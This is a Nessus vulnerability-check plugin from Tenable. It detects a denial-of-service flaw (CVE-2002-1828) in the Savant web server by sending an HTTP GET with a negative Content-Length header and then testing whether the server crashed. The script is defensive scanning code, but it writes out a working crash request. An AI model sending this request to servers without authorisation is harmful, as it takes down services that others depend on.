#
# (C) Tenable Network Security, Inc.
#

########################
# References:
########################
#
# Date: Fri, 13 Sep 2002 19:55:05 +0000
# From "Auriemma Luigi" <aluigi@pivx.com>
# To: bugtraq@securityfocus.com
# Subject: Savant 3.1 multiple vulnerabilities
#
# See also:
# Date:  Sun, 22 Sep 2002 23:19:48 -0000
# From: "Bert Vanmanshoven" <sacrine@netric.org>
# To: bugtraq@securityfocus.com
# Subject: remote exploitable heap overflow in Null HTTPd 0.5.0
# 
########################
#
# Vulnerables:
# Null HTTPD 0.5.0
#


include("compat.inc");

if(description)
{
 script_id(11174);
 script_version("$Revision: 1.20 $");
 script_cve_id("CVE-2002-1828");
 script_bugtraq_id(5707, 6255);
 script_xref(name:"OSVDB", value:"16592");

 script_name(english:"Savant Web Server Malformed Content-Length DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The Savant web server on the remote host crashes when it receives an
invalid GET HTTP request with a negative Content-Length field.  A
remote attacker can leverage this issue to disable the affected
service." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2002-09/0151.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
script_end_attributes();

 
 script_summary(english:"Savant web server crashes if Content-Length is negative");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl", "httpver.nasl");
 script_require_ports("Services/www",80);
 exit(0);
}

#

include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

if(http_is_dead(port:port))exit(0);

banner = get_http_banner(port:port);
if (!banner || "Savant/" >!< banner) exit(0);

soc = http_open_socket(port);
if (! soc) exit(0);

# Savant attack
req = string("GET / HTTP/1.0\r\nContent-Length: -1\r\n\r\n");
send(socket:soc, data: req);
r = http_recv(socket: soc);
http_close_socket(soc);

#
if(http_is_dead(port: port, retry: 3))
{
  security_warning(port);
}
